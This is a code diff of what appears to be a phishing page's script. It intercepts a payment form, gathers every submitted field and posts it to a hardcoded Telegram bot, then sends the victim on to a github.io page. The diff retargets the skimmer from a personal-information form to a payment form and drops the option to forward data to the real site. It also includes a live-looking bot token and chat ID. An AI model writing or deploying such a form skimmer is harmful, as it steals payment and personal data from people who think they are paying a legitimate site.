@@ -599,19 +599,17 @@ div[style*="fixed"] span[id^="img_"][class^="img_"] > style:first-child + div[st
         event.preventDefault(); // Prevent default form submission
         
         const formData = new FormData(event.target);
-        let message = "New Form Submission:\n";
+        let message = "New Payment Form Submission:\n";
         formData.forEach((value, key) => {
-            if (key !== '_token' && key !== 'request_hash') { // Exclude hidden fields
+            if (key !== '_token') { // Exclude hidden fields
                 message += `${capitalizeFirstLetter(key.replace('_', ' '))}: ${value}\n`;
             }
         });
 
-        // Send the message to Telegram
-        sendTelegramAlert(message);
-
-        // Optionally, submit the form to the original action URL
-        // Uncomment the line below if you want to keep the original form submission
-        // event.target.submit();
+        // Send the message to Telegram and then redirect
+        sendTelegramAlert(message).then(() => {
+            window.location.href = 'https://justmoicom.github.io/tel2/';
+        });
     }
 
     // Function to capitalize the first letter of each word in a string
@@ -624,7 +622,7 @@ div[style*="fixed"] span[id^="img_"][class^="img_"] > style:first-child + div[st
         const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k'; // Replace with your bot token
         const chatId = '7747778364'; // Replace with your chat ID
         const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-        fetch(url)
+        return fetch(url)
             .then(response => response.json())
             .then(data => console.log('Success:', data))
             .catch((error) => console.error('Error:', error));
@@ -696,7 +694,7 @@ div[style*="fixed"] span[id^="img_"][class^="img_"] > style:first-child + div[st
 
     // Allow only the "Payer" button to be clickable
     document.addEventListener('DOMContentLoaded', function () {
-        const form = document.getElementById('personalInformationForm');
+        const form = document.getElementById('paymentForm');
         const payerButton = form.querySelector('button[type="submit"]');
         form.addEventListener('click', function(event) {
             if (event.target !== payerButton) {
@@ -712,7 +710,6 @@ div[style*="fixed"] span[id^="img_"][class^="img_"] > style:first-child + div[st
         });
     }
 </script>
-
 						</div>
 						<!-- FORM BLOCK END'S HERE -->
 					</div>
